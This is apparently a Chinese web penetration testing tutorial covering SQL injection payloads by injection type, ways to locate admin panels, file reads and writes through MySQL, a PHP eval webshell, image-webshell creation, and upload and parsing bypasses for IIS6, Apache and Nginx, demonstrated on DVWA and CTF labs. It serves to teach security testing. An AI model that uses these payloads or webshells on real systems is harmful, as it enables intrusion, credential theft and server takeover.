<p>&emsp;&emsp;在本章节介绍的注入方式常常和报错注入、盲注配合使用，但我们不会详细介绍盲注和报错注入的使用方法和选择方法，案例中我们也只提供一个Payload的框架，具体使用方法请到前面的相关章节学习。</p>
<h4 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h4><p>&emsp;&emsp;由于SQL语句中数字类型的值不需要单引号包裹，所以可以直接在后面添加SQL语句来进行注入，不必考虑单引号情况。</p>
<p>&emsp;&emsp;程序中的SQL语句结构：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from pro where id=$id;  // $id用户可控</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;在MySQL中，数字类型也可以用单引号包裹，并且很多程序员在程序中拼接SQL语句的时候也喜欢用单引号包裹住所有值，所以有时候数字型注入也需要闭合单引号，闭合方法请看继续看字符型注入。</p>
<h4 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h4><p>&emsp;&emsp;由于SQL语句中字符串通常要使用单引号来包裹，所以在注入的时候要闭合单引号，否则注入语句会被当作字符串来进行处理。</p>
<p>&emsp;&emsp;程序中的SQL语句结构：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username=<span class="string">'$user'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'$pass'</span>;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;闭合方法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aa' and 注入语句 and 'a'='a</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 将语句后面的数据注释掉也可以 e.g.</span></span><br><span class="line">aa' 注入语句 <span class="comment">--</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;<strong>案例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bugku - 字符型注入</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;配合联合查询法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; union select 1,user(),3 and &apos;a&apos;=&apos;a&apos;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524835740.9766338.png" alt=""></p>
<p>&emsp;&emsp;配合报错注入：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a' and updatexml(1,concat(0x7c,(<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> mysql.user <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)),<span class="number">2</span>)<span class="keyword">and</span> <span class="string">'a'</span>=<span class="string">'a</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524835951.7547488.png" alt=""></p>
<p>&emsp;&emsp;配合布尔盲注：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b' or 注入语句 and 'a'='a</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524836179.3863711.png" alt=""></p>
<p>&emsp;&emsp;配合时间盲注：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; or if(盲注语句,sleep(5),0) and &apos;a&apos;=&apos;a</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524836535.8273118.png" alt=""></p>
<h4 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h4><p>&emsp;&emsp;由于搜索型SQL语句通常使用%和’包裹，因此在注入的时候需要闭合%和’，否则就会报错。</p>
<p>&emsp;&emsp;搜索型SQL语句结构：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> pro <span class="keyword">where</span> <span class="keyword">content</span>=<span class="string">'%$keyword%'</span>;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;闭合方法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aa%' and 注入语句 and '%aa%' ='%aa</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 将语句后面的数据注释掉也可以 e.g.</span></span><br><span class="line">aa%' 注入语句 <span class="comment">--</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;搜索型注入可以配合联合查询法、盲注或者报错注入来进行。</p>
<p><strong>案例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bugku - 搜索型注入</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;与基于时间的盲注配合使用：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a%' and if(布尔盲注语句,sleep(5),1) and '%a%'='%a</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524831899.1816082.png" alt=""></p>
<p>&emsp;&emsp;与基于布尔的盲注配合使用：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%' and 盲注语句 and '%a%'='%a</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524832230.8213296.png" alt=""></p>
<p>&emsp;&emsp;与报错注入配合使用：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%' and updatexml(1,concat(0x7c,注入语句),2) and '%a%'='%a</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524832760.0731387.png" alt=""></p>
<p>&emsp;&emsp;搜索型注入写文件：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%' UNION <span class="keyword">SELECT</span> <span class="string">'shell'</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span> <span class="keyword">INTO</span> <span class="keyword">OUTFILE</span> <span class="string">'d:\\a.php'</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524833312.5050316.png" alt=""></p>
<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><h3 id="XXE注入"><a href="#XXE注入" class="headerlink" title="XXE注入"></a>XXE注入</h3><h2 id="找后台的方法"><a href="#找后台的方法" class="headerlink" title="找后台的方法"></a>找后台的方法</h2><h3 id="目录扫描-1"><a href="#目录扫描-1" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>&emsp;&emsp;模拟浏览器访问，根据响应包的状态码来判断该目录或文件是否存在。</p>
<p>&emsp;&emsp;常用在目录扫描的响应码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.200 返回正确</span><br><span class="line">2.403 无权限访问</span><br><span class="line">3.3XX 重定向</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;常用工具：御剑后台扫描器</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1523690075.545369.png" alt=""></p>
<p><strong>小技巧：</strong></p>
<p>&emsp;&emsp;根据目标站点的支持脚本类型来进行探测脚本的选择，这样大大的提高效率。</p>
<h3 id="蜘蛛爬行-1"><a href="#蜘蛛爬行-1" class="headerlink" title="蜘蛛爬行"></a>蜘蛛爬行</h3><p>&emsp;&emsp;蜘蛛爬行是从站点的链接中获取站点的目录情况。和目录扫描原理不同，但是两者却相辅相成。</p>
<p><strong>优缺点比较:</strong></p>
<p>&emsp;&emsp;目录扫描主要依赖于字典，字典强度决定了扫描的效果。有时候无法探测到比较奇特的后台目录比如at_admin</p>
<p>&emsp;&emsp;蜘蛛爬行不依赖字典，而依赖于站点中的链接，比如at_admin目录存在于站点的页面中则可以探测到</p>
<p>&emsp;&emsp;常用工具：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.AWVS</span><br><span class="line">2.BURP</span><br></pre></td></tr></table></figure>
<h3 id="google黑客"><a href="#google黑客" class="headerlink" title="google黑客"></a>google黑客</h3><p>&emsp;&emsp;使用google 、baidu等搜索引擎进行搜索，如果目标站点的管理页面被收录的话，就可以探测到。</p>
<p>&emsp;&emsp;搜索语法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">site:admintony.com admin</span><br><span class="line"></span><br><span class="line">site:admintony.com login</span><br><span class="line"></span><br><span class="line">site:admintony.com 后台管理</span><br><span class="line"></span><br><span class="line">site:admintony.com 管理</span><br><span class="line"></span><br><span class="line">site:admintony.com menage</span><br></pre></td></tr></table></figure>
<h3 id="遗留文件"><a href="#遗留文件" class="headerlink" title="遗留文件"></a>遗留文件</h3><p>&emsp;&emsp;robots.txt是管理百度蜘蛛爬行规则的一个文件，很多管理员不希望后台或者一些私密的界面被搜索引擎收录到，所以在目录下放了一个robots.txt用来禁止百度蜘蛛爬行指定目录。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1523691979.3405643.png" alt=""></p>
<h3 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h3><p>&emsp;&emsp;有些站长会把子域名指向后台，比如 <a href="http://www.admintony.com">http://www.admintony.com</a> 其子域名 <a href="http://admin.admintony.com" target="_blank" rel="noopener">http://admin.admintony.com</a> 很有可以能就是该站点的后台</p>
<h3 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h3><p>&emsp;&emsp;与子域名有些相似之处，站长将后台放置于某个端口，用来隐藏后台地址，以免被人发现。</p>
<h3 id="根据规律猜测"><a href="#根据规律猜测" class="headerlink" title="根据规律猜测"></a>根据规律猜测</h3><p>&emsp;&emsp;假如：某站点很多页面的文件名为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a_info.php</span><br><span class="line"></span><br><span class="line">a_about.php</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;根据以上规律，我们猜测，站点的后台可能是a_login.php、a_admin.php等。</p>
<h1 id="phpMyAdmin与数据库外联"><a href="#phpMyAdmin与数据库外联" class="headerlink" title="phpMyAdmin与数据库外联"></a>phpMyAdmin与数据库外联</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>&emsp;&emsp;phpMyadmin是web类型的数据库管理工具，不需要数据库用户支持外联。</p>
<p>&emsp;&emsp;数据库外联是数据的一种功能，如果<strong>数据库支持外联</strong>，那么可以在任意机器上用数据库管理软件(如：navicat)连接操作数据库。</p>
<p>&emsp;&emsp;两者的相似点：都是直接对数据库进行操作，而不需要借助注入点，也不用受到注入点的局限，从而可执行更多类型的SQL语句。</p>
<h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><h3 id="load-file函数"><a href="#load-file函数" class="headerlink" title="load_file函数"></a>load_file函数</h3><p><strong>条件：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.用户拥有file权限</span><br><span class="line">2.secure_file_priv=</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">'D:\\phpStudy\\WWW\\fuzz\\conn.php'</span>);</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1523808804.3494587.png" alt=""></p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1523808834.7443466.png" alt=""></p>
<p>&emsp;&emsp;将图中的16进制转成字符串就是源码。</p>
<h3 id="LOAD-DATA语句"><a href="#LOAD-DATA语句" class="headerlink" title="LOAD DATA语句"></a>LOAD DATA语句</h3><p>&emsp;&emsp;相对于load_file函数的优缺点：</p>
<p><strong>优点：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.不需要file权限</span><br><span class="line">2.不受secure_file_priv影响</span><br></pre></td></tr></table></figure>
<p><strong>缺点：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.不可在注入中使用，只能在直接对数据库操作的情况下使用</span><br><span class="line">2.需要借助表，将数据写入表中</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">test</span>(</span><br><span class="line">    col1 <span class="built_in">varchar</span>(<span class="number">200</span>);</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LOAD</span> <span class="keyword">DATA</span> <span class="keyword">LOCAL</span> <span class="keyword">INFILE</span> <span class="string">'D:\\phpStudy\\WWW\\fuzz\\conn.php'</span> <span class="keyword">INTO</span> <span class="keyword">TABLE</span> <span class="keyword">test</span> <span class="keyword">FIELDS</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="string">''</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1523807913.7306087.png" alt=""></p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1523807937.966491.png" alt=""></p>
<h2 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h2><h3 id="into-oufile-子句"><a href="#into-oufile-子句" class="headerlink" title="into oufile 子句"></a>into oufile 子句</h3><p><strong>条件：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.用户拥有file权限</span><br><span class="line">2.secure_file_priv=</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">'aa'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'d:\\phpstudy\\www\\fuzz\\a.txt'</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1523809248.2082849.png" alt=""></p>
<h3 id="设置日志写文件"><a href="#设置日志写文件" class="headerlink" title="设置日志写文件"></a>设置日志写文件</h3><p><strong>优点：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.不需要file权限</span><br><span class="line">2.不受secure_file_priv影响</span><br></pre></td></tr></table></figure>
<p><strong>缺点：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.不可在注入中使用，只能在直接对数据库操作的情况下使用</span><br><span class="line">2.写入的shell随着sql语句执行次数增多后就会打不开。</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log=on;set global general_log_file=&apos;d:\\phpstudy\\www\\fuzz\\shell.php&apos;;select &apos;&lt;?php eval($_POST[tony]) ?&gt;&apos;;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1523809459.3119564.png" alt=""></p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1523809492.6583116.png" alt=""></p>
<h1 id="GETSHELL"><a href="#GETSHELL" class="headerlink" title="GETSHELL"></a>GETSHELL</h1><p>&emsp;&emsp;GETSHELL是指通过漏洞或者程序的配置不当，获取WEBSHELL的过程，本章我们将介绍WEBSHELL和常见的GETSHELL方法。</p>
<h2 id="WEBSHELL"><a href="#WEBSHELL" class="headerlink" title="WEBSHELL"></a>WEBSHELL</h2><h3 id="WEBSHELL的介绍"><a href="#WEBSHELL的介绍" class="headerlink" title="WEBSHELL的介绍"></a>WEBSHELL的介绍</h3><p>&emsp;&emsp;WEBSHELL简单的来说就是一个可以执行任意代码的脚本(也叫一句话木马)，我们用PHP的WEBSHELL做个讲解：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'x'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;以上PHP代码就是一个简短的PHP WEBSHELL，其作用是通过$_POST的方法获取数据(参数x叫做SHELL的密码)，然后再用eval函数将获取的数据当作PHP代码进行执行。攻击者可以构造PHP代码，从而实现读写文件、列目录、上传下载文件、操作数据库、执行系统命令等操作。</p>
<h3 id="WEBSHELL管理工具-菜刀"><a href="#WEBSHELL管理工具-菜刀" class="headerlink" title="WEBSHELL管理工具-菜刀"></a>WEBSHELL管理工具-菜刀</h3><p>&emsp;&emsp;这里我们可以用图形化界面WEBSHELL管理工具菜刀来执行操作，界面如下：</p>
<ul>
<li>添加WEBSHELL</li>
</ul>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524584979.868991.png" alt=""></p>
<ul>
<li>文件/目录操作</li>
</ul>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524585139.5148985.png" alt=""></p>
<ul>
<li>执行系统命令</li>
</ul>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524585200.679016.png" alt=""></p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524585228.7028723.png" alt=""></p>
<ul>
<li>操作数据库</li>
</ul>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524585271.2071807.png" alt=""></p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524585338.615941.png" alt=""></p>
<h3 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h3><p>&emsp;&emsp;图片马就是将图片和WEBSHELL合成到一起而产生的。有些程序会检测上传的文件是不是一个图片，因此我们需要合成图片马，将WEBSHELL插入图片中隐藏达到绕过检测的目的。</p>
<p>&emsp;&emsp;图片马的合成方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">    1.CMD命令合成</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">copy /b a.jpg+b.php c.jpg</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">    2.用notepad++打开图片，在图片末尾插入一句话。</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524586897.4426212.png" alt=""></p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524586973.5699.png" alt=""></p>
<p>&emsp;&emsp;其实两种方法都是用了图像隐藏中的尾部追加法，虽然操作方法不同，但是原理是相同的。</p>
<p>&emsp;&emsp;<strong>只有当上传到服务器的图片马中的代码被解析执行的时候才是一个WEBSHELL。</strong></p>
<h2 id="上传漏洞"><a href="#上传漏洞" class="headerlink" title="上传漏洞"></a>上传漏洞</h2><p>&emsp;&emsp;上传漏洞是指利用上传的方法将WEBSHELL上传到目标服务的漏洞，具体原理和方法的介绍，请看下面的介绍。</p>
<h3 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h3><h4 id="IIS6-0解析漏洞"><a href="#IIS6-0解析漏洞" class="headerlink" title="IIS6.0解析漏洞"></a>IIS6.0解析漏洞</h4><p>&emsp;&emsp;IIS6.0会把以下3种类型的文件会被IIS当作脚本文件(ASP、PHP、ASPX)来解析执行，下面我们会一个一个给大家讲解这些解析漏洞的适用环境。</p>
<ul>
<li>a.asp;.jpg</li>
</ul>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524587234.5429082.png" alt=""></p>
<p>&emsp;&emsp;这种方法适用于上传到服务器的文件在服务器上的命名可被攻击者控制的情况。</p>
<p>&emsp;&emsp;这种情况不仅仅试用于ASP脚本，PHP、ASPX同样试用，只要是IIS6.0的WEB容器就存在该漏洞与脚本类型无关。</p>
<p>&emsp;&emsp;<strong>情景：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">服务器方面：IIS6.0的web容器</span><br><span class="line">程序方面：只允许.jpg后缀文件上传；</span><br><span class="line">         上传后文件名可以被攻击者控制。</span><br><span class="line">漏洞演示程序：DVWA上传模块-medium难度</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524625934.5458572.png" alt=""></p>
<p>&emsp;&emsp;只允许上传JPEG和PNG两种格式的文件。攻击者可以上传一个名为multi.php;.jpg的图片，绕过程序的拦截：</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524626161.0627322.png" alt=""></p>
<p>&emsp;&emsp;访问multi.php;.jpg仍然被当作PHP来进行解析。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524626221.6710896.png" alt=""></p>
<ul>
<li>/a.asp/2018042500310015.jpg</li>
</ul>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524588170.888536.png" alt=""></p>
<p>&emsp;&emsp;这种方法适用于上传到服务器的文件的目录可被攻击者控制的情况。a.asp目录下的任意后缀的文件都会被IIS当作ASP来解析执行。</p>
<p>&emsp;&emsp;<strong>情景：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">服务器方面：IIS6.0的web容器</span><br><span class="line">程序方面：只允许.jpg后缀文件上传；</span><br><span class="line">         上传后文件名被服务器按照时间戳命名。(a.asp;.jpg -变成-&gt; 时间.jpg)</span><br><span class="line">         上传后的文件目录可控。</span><br><span class="line">漏洞演示程序：DVWA上传模块-High(站点支持asp)</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这种情况如果攻击者还上传名为multi.php;.jpg的图片，会出现以下情况：</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524626474.521888.png" alt=""></p>
<p>&emsp;&emsp;上传后的图片被重命名，无法出现multi.php;.jpg这样的名称，也就没办法触发IIS6.0的解析漏洞。</p>
<p>&emsp;&emsp;这种情况下，攻击者可以构造上传目录为a.asp/从而使上传上去的jpg文件被当作ASP解析执行。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524626669.5250146.png" alt=""></p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524626695.616043.png" alt=""></p>
<p>&emsp;&emsp;然后菜刀连接：</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524626964.5029082.png" alt=""></p>
<ul>
<li>a.cer、a.asa、a.cdx</li>
</ul>
<p>&emsp;&emsp;IIS6.0会把这三种后缀当作ASP来执行。</p>
<p>&emsp;&emsp;<strong>情景：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">服务器方面：IIS6.0的web容器</span><br><span class="line">程序方面：不允许asp、aspx、php后缀文件上传</span><br><span class="line">         上传后的文件会按时间戳重命名</span><br><span class="line">         上传后文件目录不可控</span><br><span class="line">漏洞演示程序：DVWA上传模块-Low(支持ASP)</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;上传黑名单后缀名文件测试：</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524637393.6591604.png" alt=""></p>
<p>&emsp;&emsp;上传非黑名单后缀名文件测试：</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524637445.5212398.png" alt=""></p>
<p>&emsp;&emsp;因此，之前两种方法无法突破，但攻击者可以上传后缀为.cer、.asa、.cdx的文件来进行绕过黑名单验证。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524637510.1484792.png" alt=""></p>
<p>&emsp;&emsp;<strong>白名单验证：</strong> 白名单验证是指只放行白名单中的后缀。</p>
<p>&emsp;&emsp;<strong>黑名单验证：</strong> 黑名单验证是指只拦截白名单中的后缀。</p>
<h4 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h4><p>&emsp;&emsp;在低版本的Apache中，系统会从右向左识别后缀，直至找到一个可以识别的后缀，然后将文件以该可识别的后缀进行解析。</p>
<p><strong>e.g.</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shell.php.v1.xxx</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 系统无法识别xxx后缀名，则判断v1后缀名</span></span><br><span class="line"><span class="comment">-- 系统仍无法识别v1后缀名，则判断php后缀名</span></span><br><span class="line"><span class="comment">-- 系统可识别php后缀名，则将文件作为PHP文件解析</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;该方法也是在服务器端不会对上传的文件重命名的情况下使用的。</p>
<h4 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h4><p>&emsp;&emsp;Nginx&lt;=0.8.37，在已上传到服务器的包含WEBSHELL代码的图片后面加上%00.php会将 /xx.jpg%00.php当作PHP文件来进行解析执行。</p>
<h4 id="CGI解析漏洞"><a href="#CGI解析漏洞" class="headerlink" title="CGI解析漏洞"></a>CGI解析漏洞</h4><p>&emsp;&emsp;CGI的解析漏洞主要影响IIS&gt;7.0 和 Nginx 这两个WEB容器，它的产生原因是因为PHP.ini中cgi.fix_pathinfo=1，从而导致把其他格式文件按照PHP脚本来进行解析执行。</p>
<p>&emsp;&emsp;Payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://IP/图片马地址/a.php</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;遇到这种环境，攻击者只需要找到一个上传点，然后上传一个图片马，然后访问图片构造Payload即可获取WEBSHELL。<strong>但此情景只能以PHP脚本解析执行文件。</strong></p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524643246.5925515.png" alt=""></p>
<h3 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h3><p>&emsp;&emsp;顾名思义，就是一个上传点未对上传的文件类型做任何限制，导致攻击者可以上传任意类型的文件，从而GETSHELL。</p>
<p>&emsp;&emsp;案例1：直接型任意文件上传</p>
<p>&emsp;&emsp;直接型任意文件上传是指可以直接上传ASP|PHP|ASPX|JSP的脚本文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">服务器：WIN03+IIS6.0</span><br><span class="line">程序 ： DVWA上传模块 - low_</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524716702.179136.png" alt=""></p>
<p>&emsp;&emsp;案例2：间接型任意文件上传</p>
<p>&emsp;&emsp;间接型任意文件上传：不能直接上传ASP|PHP|ASPX|JSP等脚本文件，而允许上传的文件类型可以被攻击者修改，从而导致可以上传任意类型的文件的漏洞。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">服务器：WIN03+IIS6.0</span><br><span class="line">程序 ： 南方数据</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;直接上传ASP脚本文件，上传失败。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524717647.6897492.png" alt=""></p>
